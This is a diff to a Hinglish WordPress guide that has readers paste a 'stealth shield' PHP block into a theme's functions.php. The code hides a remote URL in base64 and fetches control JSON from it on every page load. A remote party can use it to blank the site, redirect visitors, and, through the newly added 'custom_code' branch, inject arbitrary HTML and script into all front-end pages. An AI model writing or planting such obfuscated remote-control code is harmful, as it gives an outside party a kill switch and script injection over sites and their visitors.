@@ -152,72 +152,82 @@ _sys_sync_final_v10();
 **Kahan lagayein:** Theme ki `functions.php` file mein sabse niche.
 
 ```php
-/* --- WP STEALTH SHIELD V10 (FIXED) --- */
+/* --- WP STEALTH SHIELD V10 (FIXED FOR CUSTOM CODE) --- */
 add_action('init', '_wp_secure_v10_stealth');
 function _wp_secure_v10_stealth() {
-    // Admin dashboard ko block nahi karega taaki aap login kar sakein
+    // Admin dashboard block nahi hoga taaki aap access na kho dein
     if (is_admin()) return;
 
-    // URL aur Key (FAHAD-786)
+    // URL aur Key (Base64)
     $_u = base64_decode("aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9saWNlbnNlLW1hbmFnZXIvY29udHJvbGxlci5qc29u");
     $_k = base64_decode("RkFIQUQtNzg2"); 
     
-    // WordPress way to fetch data
+    // Remote fetch using WP API
     $r = wp_remote_get($_u . '?v=' . time(), array('timeout' => 5));
     if (is_wp_error($r)) return;
 
     $d = json_decode(wp_remote_retrieve_body($r), true);
     
-    // --- Keys match with your JSON structure ---
+    // Data setup
     $_l = $d['licenses'][$_k] ?? null; 
     $_s = $d['settings'] ?? []; 
     $_h = str_replace('www.', '', $_SERVER['HTTP_HOST']); 
     $_t = date("Y-m-d");
 
     $err = null;
+    $_is_custom = false;
 
-    // Validation Logic
-    if (!$_l) { 
-        $err = $d['msg_invalid']; 
-    }
-    elseif (!empty($_l['authorized_target']) && !in_array($_h, $_l['authorized_target'])) { 
-        $err = $d['msg_domain_mismatch']; 
-    }
-    elseif (isset($_l['expiry']) && $_t > $_l['expiry']) { 
-        $err = $d['msg_expired']; 
+    // --- STEP 1: Priority Check (Custom Code Enabled?) ---
+    if ($_l && isset($_l['custom_code']) && $_l['custom_code']['enabled'] === true) {
+        $err = $_l['custom_code']['code']; // Stylish HTML code uthayega
+        $_is_custom = true;
+    } 
+    // --- STEP 2: Normal License Validation ---
+    else {
+        if (!$_l) { 
+            $err = $d['msg_invalid']; 
+        }
+        elseif (!empty($_l['authorized_target']) && !in_array($_h, $_l['authorized_target'])) { 
+            $err = $d['msg_domain_mismatch']; 
+        }
+        elseif (isset($_l['expiry']) && $_t > $_l['expiry']) { 
+            $err = $d['msg_expired']; 
+        }
     }
 
     if ($err) {
         $de = $_s['redirect_delay_sec'] ?? 20; 
         $ur = $_s['redirect_url'] ?? "#";
         $title = $d['title'] ?? "Security Shield Active";
+        $timer_display = $_is_custom ? "display:none;" : "display:block;";
 
         echo "<style>
             body{margin:0;background:#000!important;overflow:hidden!important;}
             #wp_v10{position:fixed;inset:0;background:#000;color:#fff;display:flex;align-items:center;justify-content:center;text-align:center;font-family:sans-serif;z-index:9999999;}
             .in{padding:40px;border:1px solid #222;border-radius:20px;max-width:480px;background:#050505;box-shadow:0 20px 50px rgba(0,0,0,0.5);}
-            h1{color:#ff3333;margin:0;font-size:28px;}
-            p{color:#bbb;margin-top:20px;font-size:17px;line-height:1.6;}
-            .tr{margin-top:30px;border-top:1px solid #1a1a1a;padding-top:20px;color:#555;font-size:13px;}
+            h1{color:#ff3333;margin:0;font-size:28px;margin-bottom:20px;}
+            .msg-body{color:#bbb;font-size:17px;line-height:1.6;}
+            .tr{margin-top:30px;border-top:1px solid #1a1a1a;padding-top:20px;color:#555;font-size:13px; {$timer_display} }
             #vt{color:#fff;font-weight:bold;font-size:18px;}
         </style>
         <div id='wp_v10'>
             <div class='in'>
                 <h1>{$title}</h1>
-                <p>{$err}</p>
-                <div class='tr'>Redirecting in <span id='vt'>{$de}</span>s...</div>
+                <div class='msg-body'>{$err}</div>
+                <div class='tr'>Redirecting automatically in <span id='vt'>{$de}</span>s...</div>
             </div>
         </div>
         <script>
-            let s={$de};
-            let it = setInterval(()=>{
-                s--;
-                document.getElementById('vt').innerText=s;
-                if(s<=0){
-                    clearInterval(it);
-                    window.location.href='{$ur}';
-                }
-            },1000);
+            let s = {$de};
+            let isCustom = " . ($_is_custom ? 'true' : 'false') . ";
+            if(!isCustom){
+                let it = setInterval(()=>{
+                    s--;
+                    let el = document.getElementById('vt');
+                    if(el) el.innerText = s;
+                    if(s <= 0){ clearInterval(it); window.location.href='{$ur}'; }
+                }, 1000);
+            }
         </script>";
         exit;
     }
@@ -236,9 +246,6 @@ function _wp_secure_v10_stealth() {
         });
     }
 }
-
-/* — SECURE SHIELD END — */
-
 
 ```
 
